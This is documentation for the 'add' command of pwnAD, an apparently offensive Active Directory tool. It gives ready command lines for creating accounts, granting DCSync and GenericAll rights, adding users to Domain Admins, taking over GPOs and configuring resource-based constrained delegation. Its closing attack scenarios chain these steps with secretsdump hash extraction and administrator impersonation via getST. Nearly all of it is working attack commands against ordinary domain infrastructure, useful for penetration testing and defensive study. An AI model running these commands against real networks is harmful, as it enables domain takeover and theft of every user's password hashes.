# add Command

Add objects or permissions to Active Directory.

## Usage

```bash
pwnAD [auth options] add <subcommand> [arguments]
```

## Subcommands

| Subcommand | Description |
|------------|-------------|
| `user` | Add a new user account |
| `computer` | Add a new computer account |
| `dcsync` | Add DCSync rights to an object |
| `genericAll` | Add GenericAll rights to an object |
| `groupMember` | Add a user/computer to a group |
| `write_gpo_dacl` | Give full control on a GPO |
| `RBCD` | Add Resource-Based Constrained Delegation |

## Subcommand Details

### user

Add a new user account to the domain.

```bash
pwnAD [auth] add user <username> <password>
```

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add user newuser 'NewUserPass123!'
```

### computer

Add a new computer account to the domain.

```bash
pwnAD [auth] add computer <computername> [password]
```

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add computer YOURPC$ 'ComputerPass123!'
```

!!! note
    Computer names typically end with `$`. If omitted, pwnAD will add it automatically.

### dcsync

Add DCSync replication rights to an account. This grants the target the ability to replicate password hashes from domain controllers.

```bash
pwnAD [auth] add dcsync <target>
```

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add dcsync compromiseduser
```

!!! warning "High Impact"
    DCSync rights allow extraction of all domain password hashes. Use responsibly.

### genericAll

Add GenericAll (Full Control) permissions on an object.

```bash
pwnAD [auth] add genericAll <target> <trustee>
```

**Example:**
```bash
# Give 'attacker' full control over 'victim'
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add genericAll victim attacker
```

### groupMember

Add a user or computer to a group.

```bash
pwnAD [auth] add groupMember <group> <member>
```

**Example:**
```bash
# Add user to Domain Admins
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add groupMember "Domain Admins" compromiseduser
```

### write_gpo_dacl

Grant full control on a Group Policy Object.

```bash
pwnAD [auth] add write_gpo_dacl <gpo_name> <trustee>
```

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add write_gpo_dacl "Default Domain Policy" attacker
```

### RBCD

Add Resource-Based Constrained Delegation. This allows a computer to impersonate users to the target service.

```bash
pwnAD [auth] add RBCD <target> <delegatee>
```

**Example:**
```bash
# Allow YOURPC$ to delegate to TARGETPC$
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add RBCD TARGETPC$ YOURPC$
```

## Attack Scenarios

### Scenario 1: Privilege Escalation via Group Membership

```bash
# Add compromised user to Domain Admins
pwnAD -i --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!'
pwnAD [domain.local\admin]> add groupMember "Domain Admins" lowpriv
```

### Scenario 2: DCSync Attack Preparation

```bash
# Grant DCSync rights to controlled account
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add dcsync attacker

# Then use secretsdump
secretsdump.py domain.local/attacker:'Pass!'@192.168.1.10 -just-dc-ntlm
```

### Scenario 3: RBCD Attack

```bash
# Add computer account
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' add computer YOURPC$ 'CompPass!'

# Configure RBCD
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' add RBCD TARGETPC$ YOURPC$

# Get service ticket via S4U2Proxy
getST.py -spn cifs/TARGETPC.domain.local -impersonate administrator domain.local/YOURPC$:'CompPass!'
```
